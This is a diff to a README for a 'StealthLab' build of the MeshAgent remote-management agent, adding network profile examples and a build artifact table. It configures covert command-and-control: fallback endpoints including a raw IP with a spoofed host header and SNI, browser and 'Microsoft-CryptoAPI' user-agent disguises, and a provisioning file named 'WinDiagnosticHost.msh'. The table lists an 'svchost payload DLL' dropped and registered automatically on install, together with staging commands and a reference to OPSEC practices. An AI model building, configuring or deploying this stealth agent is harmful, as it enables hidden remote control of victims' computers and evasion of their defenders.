@@ -333,11 +333,38 @@ The companion `branding_config.template.json` now mirrors every field consumed b
 > When `stealth.svchostMode` is enabled the build pipeline now forces `stealth.bundleExtract` on so the svchost DLL payload is dropped and registered automatically during installation.
 ```
 
+### Network Profile Examples
+
+MeshAgent now supports both fully static and MeshCentral-assigned (dynamic) control channels. Pick the profile that matches your deployment strategy and update `branding_config.local.json` before running the packaging pipeline.
+
+| Profile | When to use it | Sample snippet |
+| --- | --- | --- |
+| **Static (curated hosts + fallbacks)** | You control the front door endpoints and want the agent to rotate through a pre-defined list if MeshCentral metadata is missing. | ```jsonc\n\"network\": {\n  \"primaryEndpoint\": \"wss://agents.high.support:4445/agent.ashx\",\n  \"fallbackEndpoints\": [\n    { \"url\": \"wss://agents.high.support:4446/agent.ashx\", \"sni\": \"agents.high.support\", \"hostHeader\": \"agents.high.support\", \"alpn\": [\"http/1.1\"] },\n    { \"url\": \"wss://agents-dr.high.support:4445/agent.ashx\", \"sni\": \"agents-dr.high.support\", \"userAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\" },\n    { \"url\": \"wss://198.51.100.45:443/agent.ashx\", \"hostHeader\": \"agents.high.support\", \"sni\": \"agents.high.support\" }\n  ],\n  \"userAgent\": \"Microsoft-CryptoAPI/10.0\",\n  \"alpn\": [\"http/1.1\"],\n  \"retryAttempts\": 5,\n  \"retryDelay\": 10\n}\n``` |
+| **Dynamic (MeshCentral assigns URLs and ports)** | You want MeshCentral to publish control-channel metadata on demand (e.g., per tenant/device group). Branding leaves the endpoint blank and the agent waits for `.msh` provisioning data. | ```jsonc\n\"network\": {\n  \"dynamic\": true,\n  \"userAgent\": \"Microsoft-CryptoAPI/10.0\"\n}\n``` |
+| **Hybrid (static defaults + MeshCentral override)** | Keep static fallbacks but allow MeshCentral to override the primary via the downloaded `.msh`. | ```jsonc\n\"network\": {\n  \"primaryEndpoint\": \"wss://agents.example.net:443/agent.ashx\",\n  \"dynamic\": true,\n  \"fallbackEndpoints\": [\n    { \"url\": \"wss://198.51.100.10:443/agent.ashx\", \"sni\": \"agents.example.net\" }\n  ]\n}\n``` |
+
+**Port reference:** Make sure outbound TCP is permitted to every host/port pair you advertise. The default StealthLab profile uses `agents.high.support:4445`, `agents.high.support:4446`, `agents-dr.high.support:4445`, and `198.51.100.45:443`. Update the allowlist whenever you change the branding JSON so runtime validation does not fail on blocked egress.
+
+> **MeshCentral staging tip:** Whenever you enable `network.dynamic`, regenerate provisioning assets (`pwsh .\\tools\\embed_provisioning.ps1`) so the compiled header carries `NULL` endpoints and MeshCentral can supply the active URL via `WinDiagnosticHost.msh`.
+
 Keep the JSON committed without secrets; override sensitive values via environment variables or CI secrets when needed.
 
 ---
 
+### Current StealthLab Build Snapshot (2025-10-27)
+
+| Artifact | Path | SHA256 | Notes |
+| --- | --- | --- | --- |
+| x64 svchost payload DLL | `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` | `60B7FA17A906E6C921197D87D957DC99730228E4001D84CDC5F2312F557E650F` | Embedded via `meshcore\embedded\generated\svchost_payload.h` |
+| x64 service wrapper | `meshservice\x64\StealthLab\MeshService-2022.exe` | `18284E2EDC3520F90AE4CF91E41DC35CA336D44DC2F3750AD77F22EA49C16427` | Staged to `meshcentral-data\agents\MeshService64.exe` |
+| Win32 service wrapper | `meshservice\StealthLab\MeshService-2022.exe` | `D04A088EA0AF73D8B4DBB7DE917C37C80E4D4F8BDB20137BFA44394C9E630B7E` | Staged to `meshcentral-data\agents\MeshService.exe` |
+| Provisioning manifest | `meshservice\x64\StealthLab\MeshService-2022.msh` | `4ACEB797EEC7AD1772786B8EC1B87F327BD25DAEE60A4E666ABBF614345F4812` | Dynamic endpoints—MeshCentral overrides at download |
+
+These files were staged with `pwsh .\tools\stage_meshcentral_agents.ps1 -MeshCentralDataPath '..\MeshCentral\meshcentral-data' -IncludeWin32 -SkipBuild`. Restart MeshCentral (or let it auto-reload) so portal downloads serve the refreshed binaries.
+
 Need more depth? Refer to `STEALTHLAB_CONFIG_GUIDE.md` for registry/service layout and `OPSEC.md` for operational security practices. For assistance or questions, open an issue or contact the maintainer directly.
+
+
 
 
 
